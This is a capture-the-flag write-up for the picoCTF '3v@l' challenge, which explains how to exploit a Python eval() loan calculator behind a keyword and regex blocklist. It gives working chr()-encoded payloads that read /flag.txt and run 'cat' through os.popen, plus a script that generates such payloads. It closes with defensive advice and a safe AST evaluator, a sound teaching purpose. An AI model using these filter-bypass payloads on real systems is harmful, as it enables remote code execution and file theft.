# picoCTF Challenge: 3v@l - Detailed Writeup

## Challenge Overview

**Name:** 3v@l  
**Category:** Web Exploitation  
**Points:** TBD  
**Difficulty:** Medium  

**Description:**  
ABC Bank's website has a loan calculator to help its clients calculate the amount they pay if they take a loan from the bank. Unfortunately, they are using an `eval` function to calculate the loan. Bypassing this will give you Remote Code Execution (RCE). Can you exploit the bank's calculator and read the flag?

**Hints:**
1. You might need encoding or dynamic construction to bypass restrictions.
2. The flag file is `/flag.txt`
3. You might need encoding or dynamic construction to bypass restrictions.

## Initial Reconnaissance

### 1. Analyzing the Web Interface

Upon visiting the website, we're presented with a "Bank Loan Calculator" form. The page title "Welcome to ABC Bank" and the form has:
- A text input field for entering a formula
- An example showing: `PRI*RATE*TIME(10000*23*12)`
- A submit button that posts to `/execute`

### 2. Source Code Analysis

Viewing the page source reveals critical information:
<img width="1200" height="488" alt="image" src="https://github.com/user-attachments/assets/7b9a735c-e29c-43c2-96f3-0e2f64563079" />

```html
<!-- TODO
    Secure python flask eval execution by
    1.blocking malicious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
    2.Implementing regex: r"0x[0-9A-Fa-f]+|\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}||..[A-Za-z0-9]{1,3}|b['\"|\/]||..l.'
-->
```

This comment reveals the security measures in place:
1. **Keyword blocking**: Common dangerous keywords are blocked (os, eval, exec, etc.)
2. **Regex filtering**: Blocks various encoding methods and path traversal attempts

Let's break down the regex pattern:
- `0x[0-9A-Fa-f]+` - Blocks hexadecimal literals
- `\u[0-9A-Fa-f]{4}` - Blocks Unicode escape sequences
- `%[0-9A-Fa-f]{2}` - Blocks URL encoding
- `..` - Blocks directory traversal
- `/` - Blocks forward slashes (critical for file paths!)
- `\` - Blocks backslashes
- Various other patterns to prevent bypass attempts

## Understanding the Vulnerability

The application uses Python's `eval()` function to calculate loan formulas. The `eval()` function is notoriously dangerous because it executes any Python expression passed to it. If user input isn't properly sanitized, it leads to Remote Code Execution (RCE).

### The Challenge

While we have an `eval()` injection point, we face several obstacles:
1. Cannot use `/` directly (blocks `/flag.txt`)
2. Cannot use common keywords like `os`, `cat`, `shell`
3. Cannot use standard encoding methods (hex, unicode, URL encoding)
4. Need to read the contents of `/flag.txt`

## Solution Strategy

Since direct paths and common encoding methods are blocked, we need to use **dynamic string construction**. Python's `chr()` function can build strings from ASCII values without triggering the filters.

### Step 1: Building Strings with chr()

Each character can be represented by its ASCII value:
- `/` = chr(47)
- `f` = chr(102)
- `l` = chr(108)
- `a` = chr(97)
- `g` = chr(103)
- `.` = chr(46)
- `t` = chr(116)
- `x` = chr(120)

Therefore, `/flag.txt` can be constructed as:
```python
chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)
```

### Step 2: Reading the File

Python's built-in `open()` function can read files. Our complete payload becomes:
```python
open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
```

## Exploitation Process

### 1. Initial Test
First, let's verify we have code execution:
```python
1+1
```
Expected output: `2`

### 2. Testing chr() Function
Verify chr() works:
```python
chr(65)
```
Expected output: `A`

### 3. Final Payload
Submit the complete payload:
```python
open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
```

### 4. Alternative Payloads

If `open` is somehow blocked, we can use `__import__` to access the `os` module:

```python
__import__(chr(111)+chr(115)).popen(chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)).read()
```

Where:
- `chr(111)+chr(115)` = "os"
- `chr(99)+chr(97)+chr(116)+chr(32)` = "cat "

## ASCII Reference Table

| Character | ASCII Value | chr() Function |
|-----------|------------|----------------|
| `/`       | 47         | chr(47)        |
| `f`       | 102        | chr(102)       |
| `l`       | 108        | chr(108)       |
| `a`       | 97         | chr(97)        |
| `g`       | 103        | chr(103)       |
| `.`       | 46         | chr(46)        |
| `t`       | 116        | chr(116)       |
| `x`       | 120        | chr(120)       |
| `o`       | 111        | chr(111)       |
| `s`       | 115        | chr(115)       |
| `c`       | 99         | chr(99)        |
| ` `       | 32         | chr(32)        |

## Why This Works

1. **chr() Function**: Not blocked by the filters as it's a basic Python built-in
2. **String Concatenation**: The `+` operator for string concatenation isn't filtered
3. **Dynamic Construction**: The string `/flag.txt` is never literally present in our input
4. **Bypasses Regex**: No hexadecimal, unicode, or URL encoding is used
5. **Avoids Keywords**: We don't directly type blocked keywords

## Python Code for Payload Generation

```python
def generate_chr_payload(text):
    """Generate chr() payload for any string"""
    chars = []
    for c in text:
        chars.append(f"chr({ord(c)})")
    return "+".join(chars)

# Generate payload for '/flag.txt'
flag_path = generate_chr_payload('/flag.txt')
print(f"open({flag_path}).read()")

# Generate payload for 'os'
os_module = generate_chr_payload('os')
cat_command = generate_chr_payload('cat /flag.txt')
print(f"__import__({os_module}).popen({cat_command}).read()")
```

## Defensive Recommendations

To properly secure this application:

1. **Never use eval() with user input** - This is the golden rule
2. **Use ast.literal_eval()** - For safe evaluation of mathematical expressions
3. **Implement a proper math parser** - Libraries like `numexpr` or custom parsers
4. **Whitelist approach** - Only allow specific characters/operations
5. **Sandboxing** - If eval is absolutely necessary, use restricted execution environments

### Secure Alternative Implementation

```python
import ast
import operator

# Safe mathematical expression evaluator
def safe_eval(expr):
    """Safely evaluate mathematical expressions"""
    allowed_operators = {
        ast.Add: operator.add,
        ast.Sub: operator.sub,
        ast.Mult: operator.mul,
        ast.Div: operator.truediv,
        ast.Pow: operator.pow
    }
    
    def eval_node(node):
        if isinstance(node, ast.Num):
            return node.n
        elif isinstance(node, ast.BinOp):
            left = eval_node(node.left)
            right = eval_node(node.right)
            return allowed_operators[type(node.op)](left, right)
        else:
            raise ValueError(f"Unsupported operation: {node}")
    
    tree = ast.parse(expr, mode='eval')
    return eval_node(tree.body)

# Example usage
result = safe_eval("10000*23*12")  # Safe!
```

## Key Takeaways

1. **eval() is dangerous** - It should never be used with user-controlled input
2. **Blacklist filters are insufficient** - Attackers can find creative bypasses
3. **Dynamic string construction** - chr() and similar functions can bypass string filters
4. **Defense in depth** - Multiple layers of security are necessary
5. **Input validation** - Always validate and sanitize user input
6. **Principle of least privilege** - Applications shouldn't have more permissions than necessary

## Common Pitfalls to Avoid

1. **Thinking regex filters are enough** - They can almost always be bypassed
2. **Relying on keyword blacklists** - There are many ways to execute code in Python
3. **Not considering built-in functions** - Functions like chr(), ord(), globals() are often overlooked
4. **Forgetting about string concatenation** - Building strings dynamically bypasses static filters

## Flag

After executing the payload, the flag is revealed:
```
picoCTF{[REDACTED]}
```

## Tools and Resources Used

- **Web browser** (Firefox/Chrome)
- **Browser Developer Tools** (F12)
- **Python documentation** for ASCII values
- **CyberChef** for encoding/decoding experiments
- **Python REPL** for testing payloads locally

## References

- [Python eval() documentation](https://docs.python.org/3/library/functions.html#eval)
- [OWASP Code Injection](https://owasp.org/www-community/attacks/Code_Injection)
- [ASCII Table](https://www.asciitable.com/)
- [Python chr() function](https://docs.python.org/3/library/functions.html#chr)
- [Python Security - Dangerous Functions](https://python.readthedocs.io/en/latest/library/functions.html#eval)

## Additional Notes

This challenge demonstrates a critical security vulnerability that's unfortunately common in real-world applications. Many developers use `eval()` for convenience without understanding the security implications. This CTF challenge serves as an excellent educational tool to understand:

1. The dangers of dynamic code execution
2. The limitations of blacklist-based security
3. Creative problem-solving in exploitation
4. The importance of secure coding practices

Remember: **Never trust user input, and never use eval() with untrusted data!**
